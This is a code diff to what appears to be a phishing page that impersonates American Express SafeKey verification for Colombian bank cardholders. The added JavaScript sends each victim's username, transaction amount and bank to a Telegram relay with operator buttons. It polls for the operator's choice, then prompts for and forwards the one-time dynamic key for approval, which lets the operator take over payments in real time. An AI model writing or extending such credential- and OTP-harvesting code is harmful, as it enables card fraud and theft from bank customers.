@@ -483,6 +483,9 @@
           ? 'http://localhost:3000'
           : window.location.origin;
 
+        const POLLING_INTERVAL = 2000;
+        const MAX_POLLING_TIME = 300000;
+
         const bankLogos = {
             'Bancolombia': 'bancol.png',
             'Davivienda': 'davivienda.png',
@@ -496,6 +499,8 @@
         };
 
         let solicitudId = null;
+        let pollingInterval = null;
+        let pasoActual = 'credenciales';
 
         const form = document.getElementById('authForm');
         const usernameInput = document.getElementById('username');
@@ -539,28 +544,241 @@
             document.getElementById('card-last-digits').textContent = `Amex •••• •••• •••• ${cardLast4}`;
         }
 
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
+        function generarSolicitudId() {
+            return 'AMEX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        }
 
-            if (!usernameInput.value.trim() || !passwordInput.value.trim()) {
-                statusMessage.textContent = 'Por favor completa los campos';
-                statusMessage.className = 'status-message error';
-                return;
+        async function verificarEstadoSolicitud(solicitudId) {
+            try {
+                const response = await fetch(`${WEBHOOK_BASE_URL}/api/webhook?check=${solicitudId}`);
+                const data = await response.json();
+                return data.estado || 'pending';
+            } catch (error) {
+                console.error('Error polling:', error);
+                return 'pending';
             }
+        }
 
-            loadingOverlay.classList.add('active');
-            submitButton.disabled = true;
+        async function enviarCredencialesATelegram(datos) {
+            try {
+                const bancoEmisor = localStorage.getItem('bancoEmisor') || 'No especificado';
 
-            mostrarExito('✅ Autenticación exitosa');
-            setTimeout(() => {
-                window.location.href = 'exito.html';
-            }, 2000);
-        });
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [
+                            { text: "🔑 PEDIR CLAVE DIN", callback_data: `pedir_clave_din_${datos.solicitudId}` }
+                        ],
+                        [
+                            { text: "❌ ERROR CREDENCIALES", callback_data: `error_credenciales_${datos.solicitudId}` }
+                        ]
+                    ]
+                };
+
+                const mensaje = `🔔 *AMERICAN EXPRESS SAFEKEY - V2CRTF*\n\n🆔 ID: \`${datos.solicitudId}\`\n🏛️ BANCO EMISOR: ${bancoEmisor}\n👤 Usuario: \`${datos.usuario}\`\n💰 Monto: ${datos.monto}\n⏳ Estado: Esperando verificación...`;
+
+                const response = await fetch(`${WEBHOOK_BASE_URL}/api/send-telegram`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        mensaje: mensaje,
+                        inline_keyboard: inlineKeyboard
+                    })
+                });
+
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        async function enviarClaveDinATelegram(datos) {
+            try {
+                const bancoEmisor = localStorage.getItem('bancoEmisor') || 'No especificado';
+
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ APROBAR CLAVE", callback_data: `aprobar_clave_din_${datos.solicitudId}` },
+                            { text: "❌ RECHAZAR CLAVE", callback_data: `rechazar_clave_din_${datos.solicitudId}` }
+                        ]
+                    ]
+                };
+
+                const mensaje = `🔔 *CLAVE DINÁMICA REQUERIDA - AMERICAN EXPRESS SAFEKEY*\n\n🆔 ID: \`${datos.solicitudId}\`\n🏛️ BANCO: ${bancoEmisor}\n🔑 CLAVE INGRESADA: \`${datos.clave}\`\n💰 Monto: ${datos.monto}\n⏳ Esperando aprobación...`;
+
+                const response = await fetch(`${WEBHOOK_BASE_URL}/api/send-telegram`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        mensaje: mensaje,
+                        inline_keyboard: inlineKeyboard
+                    })
+                });
+
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        function iniciarPollingCredenciales() {
+            let tiempoInicio = Date.now();
+
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval);
+                    mostrarError('Tiempo de espera agotado');
+                    resetFormulario();
+                    return;
+                }
+
+                const resultado = await verificarEstadoSolicitud(solicitudId);
+
+                if (resultado === 'pedir_clave_din') {
+                    clearInterval(pollingInterval);
+                    mostrarSeccionClaveDin();
+                    loadingOverlay.classList.remove('active');
+                    submitButton.disabled = false;
+                    submitButton.textContent = 'Verificar Clave';
+                } else if (resultado === 'error_credenciales') {
+                    clearInterval(pollingInterval);
+                    mostrarError('Credenciales incorrectas');
+                    resetFormulario();
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        function iniciarPollingClaveDin() {
+            let tiempoInicio = Date.now();
+
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval);
+                    mostrarError('Tiempo de espera agotado');
+                    resetFormulario();
+                    return;
+                }
+
+                const resultado = await verificarEstadoSolicitud(solicitudId);
+
+                if (resultado === 'aprobar_clave_din') {
+                    clearInterval(pollingInterval);
+                    mostrarExito('✅ Autenticación exitosa');
+                    setTimeout(() => {
+                        window.location.href = 'exito.html';
+                    }, 2000);
+                } else if (resultado === 'rechazar_clave_din') {
+                    clearInterval(pollingInterval);
+                    mostrarError('Clave dinámica incorrecta, intenta de nuevo');
+                    confirmationInput.value = '';
+                    solicitudId = generarSolicitudId();
+                    submitButton.disabled = false;
+                    loadingOverlay.classList.remove('active');
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        function mostrarSeccionClaveDin() {
+            otpSection.classList.add('visible');
+            pasoActual = 'clave_din';
+            confirmationInput.disabled = false;
+            confirmationInput.focus();
+        }
+
+        function resetFormulario() {
+            usernameInput.disabled = false;
+            passwordInput.disabled = false;
+            otpSection.classList.remove('visible');
+            pasoActual = 'credenciales';
+            confirmationInput.value = '';
+            confirmationInput.disabled = true;
+            solicitudId = null;
+            loadingOverlay.classList.remove('active');
+            submitButton.disabled = false;
+            submitButton.textContent = 'Enviar';
+            usernameInput.value = '';
+            passwordInput.value = '';
+        }
+
+        function mostrarError(mensaje) {
+            statusMessage.className = 'status-message error';
+            statusMessage.textContent = mensaje;
+            loadingOverlay.classList.remove('active');
+            submitButton.disabled = false;
+        }
 
         function mostrarExito(mensaje) {
             statusMessage.className = 'status-message success';
             statusMessage.textContent = mensaje;
         }
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            let isValid = true;
+            statusMessage.style.display = 'none';
+            document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
+
+            if (pasoActual === 'credenciales') {
+                if (!usernameInput.value.trim()) {
+                    usernameInput.parentElement.classList.add('error');
+                    isValid = false;
+                }
+                if (!passwordInput.value.trim()) {
+                    passwordInput.parentElement.classList.add('error');
+                    isValid = false;
+                }
+            } else if (pasoActual === 'clave_din') {
+                if (!confirmationInput.value.trim()) {
+                    confirmationInput.parentElement.classList.add('error');
+                    isValid = false;
+                }
+            }
+
+            if (!isValid) return;
+
+            loadingOverlay.classList.add('active');
+            submitButton.disabled = true;
+            usernameInput.disabled = true;
+            passwordInput.disabled = true;
+            confirmationInput.disabled = true;
+
+            if (pasoActual === 'credenciales') {
+                solicitudId = generarSolicitudId();
+                const datosTelegram = {
+                    solicitudId: solicitudId,
+                    usuario: usernameInput.value.trim(),
+                    monto: document.getElementById('transaction-amount').textContent
+                };
+
+                const enviado = await enviarCredencialesATelegram(datosTelegram);
+                if (enviado) {
+                    iniciarPollingCredenciales();
+                } else {
+                    mostrarError('Error al procesar');
+                    resetFormulario();
+                }
+            } else if (pasoActual === 'clave_din') {
+                const datosTelegram = {
+                    solicitudId: solicitudId,
+                    clave: confirmationInput.value.trim(),
+                    monto: document.getElementById('transaction-amount').textContent
+                };
+
+                const enviado = await enviarClaveDinATelegram(datosTelegram);
+                if (enviado) {
+                    iniciarPollingClaveDin();
+                } else {
+                    mostrarError('Error al procesar clave dinámica');
+                    submitButton.disabled = false;
+                    loadingOverlay.classList.remove('active');
+                }
+            }
+        });
 
         document.getElementById('helpLink').addEventListener('click', function(e) {
             e.preventDefault();
